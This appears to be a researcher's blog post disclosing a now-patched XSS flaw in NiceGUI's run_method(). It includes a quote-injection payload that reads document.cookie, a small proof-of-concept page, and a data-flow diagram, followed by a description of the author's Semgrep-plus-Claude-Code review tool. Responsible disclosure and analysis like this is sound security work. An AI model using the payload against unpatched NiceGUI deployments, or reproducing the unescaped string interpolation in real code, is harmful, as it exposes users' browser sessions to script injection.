---
title: "XSS via Code Injection in NiceGUI"
date: 2026-02-13T19:47:59-08:00
draft: false
toc: false
images:
tags:
  - python
  - cve-analysis
  - development
---

NiceGUI is a Python framework that lets you build web-based UIs directly in Python, with no HTML/CSS/JS required. It handles both the frontend and backend, making it easy to create interactive dashboards, tools, and apps with a clean, declarative API. To be able to do this, NiceGUI has functions that construct Javascript code from input received through Python code. One of these functions, `run_method()`, was vulnerable to quote injection that allowed providing input in ways that led to XSS.

This vulnerability has been assigned [CVE-2026-27156 / GHSA-78qv-3mpx-9cqq](https://github.com/zauberzeug/nicegui/security/advisories/GHSA-78qv-3mpx-9cqq)

The PoCs were tested on NiceGUI 3.7.1 installed from pypi. This issue is fixed in NiceGUI 3.8.0.

Side Note: At the end I also talk about [Paladin](https://github.com/anuraagbaishya/paladin), a Semgrep runner and result manager. It's what I use for many aspects of my research - and it's open source!

## Semgrep result evaluation (or lack thereof)
When you do something a lot of times over a long period of time, you generally develop methodologies to make yourself more efficient at it. It is no different for me when I review Semgrep results. The results I am usually looking at have close to a hundred (and sometimes multiple hundreds) of findings - most of them are just noise. For me (and my friend Mr. Claude) to be able to effectively analyze the scan result within a reasonable timeframe (and without burning millions of tokens), I have developed a systematic way to prune the number of findings:
1. Sort by severity - error, warning, note.
2. Sort by confidence - high, medium, low. (This is the confidence noted in the Semgrep rule and subsequently in all findings for that rule)
3. Remove any findings which seem noisy - use of sha1, use of innerHTML, etc

The third bullet is a mental bias - rules that I *think* are noisy, from looking at a lot of findings with these rules that did not materialize into anything interesting. The thing is how you interpret a finding depends on what your end goal is. At work I look at results from a defensive point of view - finding unsafe code patterns and recommending secure coding practices to resolve such risks. When I look at results for personal research, I am looking for exploitable vulnerabilities. Therefore, the rules I care about also differ by setting.

## Context confusion
The few days leading upto me finding this vulnerability were something like this - help teams reduce their risk of security issues by providing guidance sourced from reviewing Semgrep results during the day, and then try to find exploitable vulnerabilities in open source software by reviewing Semgrep results in the evening. If you guessed I used my "work filters" to review NiceGUI, you would be right. One of the rules I generally don't care about for personal research is `javascript.lang.security.audit.unsafe-dynamic-method ` (from Semgrep community rules). However, by muscle memory, I found myself looking into findings for this rule.

## Using non-static data to retrieve and run functions
(Yes, I copied the first few words from the rule's message.) The function reported by Semgrep is 
```javascript
function runMethod(target, method_name, args) {
  if (typeof target === "object") {
    if (method_name in target) {
      return target[method_name](...args);
    } else {
      return eval(method_name)(target, ...args);
    }
  }
  const element = getElement(target);
  if (element === null || element === undefined) return;
  if (method_name in element) {
    return element[method_name](...args);
  } else if (method_name in (element.$refs.qRef || [])) {
    return element.$refs.qRef[method_name](...args);
  } else {
    return eval(method_name)(element, ...args);
  }
}
```
from `nicegui/static/nicegui.js`

The `eval()` lines immediately caught my eye. If there was a way to get user input into this function, it would `eval` the input. Grepping for `runMethod` I found

```python
def run_method(self, name: str, *args: Any, timeout: float = 1) -> AwaitableResponse:
    if not core.loop:
        return NullResponse()
    return self.client.run_javascript(
        f'return runMethod({self.id}, "{name}", {json.dumps(args)})',
        #                              
        timeout=timeout
    )
```
in `nicegui/element.py`. The `name` parameter in this function uses string interpolation (`"{name}"`) without escaping. This allows for code injection.

### Attack Flow

```
Input: 'x", alert(document.cookie), "y'
  ↓
Python generates:
  f'return runMethod(123, "{name}", [])'
  → 'return runMethod(123, "x", alert(document.cookie), "y", [])'
  ↓
Client-side eval() executes:
  runMethod receives three arguments
  alert(document.cookie) executes during parsing
  ↓
XSS achieved
```

### Proof of Concept

```python
from nicegui import ui

@ui.page('/')
def page(method: str = 'focus'):
    input_field = ui.input('Test')
    ui.button('Execute', on_click=lambda: input_field.run_method(method))

ui.run()
```

**Test:** Visit `/?method=x", alert(1), "y` and click "Execute"
**Result:** Alert executes

## Code Flow Analysis

```
┌─────────────────────────────────────────────────────────┐
│ 1. HTTP Request                                         │
│    /?method=x", alert(1), "y                            │
└────────────────────┬────────────────────────────────────┘
                     ↓
┌─────────────────────────────────────────────────────────┐
│ 2. Parameter Injection                          │
│    def page(method: str = 'x", alert(1), "y')           │
└────────────────────┬────────────────────────────────────┘
                     ↓
┌─────────────────────────────────────────────────────────┐
│ 3. element.py                                           │
│    f'return runMethod(123, "{name}", [])'               │
│    → 'return runMethod(123, "x", alert(1), "y", [])'    │
└────────────────────┬────────────────────────────────────┘
                     ↓
┌─────────────────────────────────────────────────────────┐
│ 4. WebSocket Message                                    │
│    {"code": "return runMethod(123, \"x\", alert(1)..."}│
└────────────────────┬────────────────────────────────────┘
                     ↓
┌─────────────────────────────────────────────────────────┐
│ 5. nicegui.js                                           │
│    eval('return runMethod(123, "x", alert(1), "y", [])' │
└────────────────────┬────────────────────────────────────┘
                     ↓
┌─────────────────────────────────────────────────────────┐
│ 6. XSS Execution                                        │
│    alert(1) runs in user's browser context              │
└─────────────────────────────────────────────────────────┘
```
There you have it. By a bit of luck, I did not ignore a rule I would otherwise have, and found some XSS.

## Additonal findings

Based on this report, the maintainers did their own due diligence and discovered many other functions that were similarly vulnerable. This is complete list as noted in the advisory:
* `Element.run_method()`
* `Element.get_computed_prop()`
* `AgGrid.run_grid_method()`
* `AgGrid.run_row_method()`
* `EChart.run_chart_method()`
* `JsonEditor.run_editor_method()`
* `Xterm.run_terminal_method()`
* `Leaflet.run_map_method()`
* `Leaflet.run_layer_method()`
* `LeafletLayer.run_method()`

---

## Introducing Paladin

[Paladin](https://github.com/anuraagbaishya/paladin) is a Semgrep runner and result manager. It has the following features:

### Scanning
* You can scan a repo it Github URL or from Github Security Advisories (GHSAs).
* A custom results viewer shows findings grouped by rules.
* A configurable SARIF cleaner cleans SARIF files based on configured rule paths and individual rules. This cleaner runs automatically after a scan so you never see results from rules you don't care about.

### Scan Result Viewer
The Scan Result Viewer provides these functionalities for each finding:

* Opening the source file in an embedded code viewer.
* Suppressing individual findings. Suppressed findings will not be shown in future views.
* Reviewing the finding using Claude Code.

The result viewer also allows configuring rules and files you want to suppress findings for at a repo level instead of globally.

### AI Review
* AI Review uses Claude Code (via a bridge server that runs on the host machine (outside Docker) if Paladin is used via the Docker container).
* The bridge server sends the finding details and repository path to Claude Code, which analyzes the code in context and returns a structured verdict (true positive / false positive with reasoning).

### GHSAs Viewer
* You can optionally fetch and review latest GHSAs.
* You can then scan repos where Paladin was able to find the repo from the advisory.

## How I use Paladin and Claude code for my research
My go-to way of using Paladin is to go through the GHSAs and then scan repos that have interesting GHSAs. This drastically reduces combing through thousands of repos on Github to find a research target. I found NiceGUI because there were a few GHSAs for it.

Next I run a scan and then quickly skim through the result using the methodology I mentioned earlier. From this I determine rules and file paths I am not interested in for the repo. I analyze the remaining findings by viewing the file and deciding if it needs a complete in-depth review. The few shortlisted findings go through a Claude code review. I have a Claude code skill that performs complete data flow analysis and provides an assessment of whether the finding is a true positive or false positive. More often than not, I usually pay much more attention to the data flow analysis than the verdict.

After performing all these steps, I am usually left with a handful of findings (or none!) that I pursue for exploitability. I use a combination of manually reviewing the data flow, asking Claude code to review additional code paths, and testing payloads to confirm whether the finding can be exploited. (Usually the answer is no...). 

You may ask why not just have Claude code review the repo instead of this multi-step process of first running Semgrep, then using heuristics and filters to reduce the number of findings, and finally selectively asking Claude code to review a few findings. This is valid question, given [Claude Opus 4.6 can find vulnerabilities without specialized tools](https://red.anthropic.com/2026/zero-days/). The truth is, I don't want to spend $100-$200 a month on a Claude subscription. I currently have a $20 subscription - that I am evaluating on whether I use it enough to justify the cost. Currently, the answer is a resounding yes!

Anyway, that's all folks. See you in the next one - once Claude finds me more vulnerabilities...

## Timeline
* February 11, 2026: Reported issue to NiceGUI maintainers through Github security advisories. (I submitted 2 reports. We agreed that the other one was not a vulnerability.)
* February 13, 2026: Received a through assessment of the report from NiceGUI maintainers -  including fix plans.
* February 24, 2026: Issue patched in NiceGUI 3.8.0. Shoutout to the maintainers for addressing this issue prompty. This is by far the quickest patch for a report I have submitted.
* February 25, 2026: Blog published.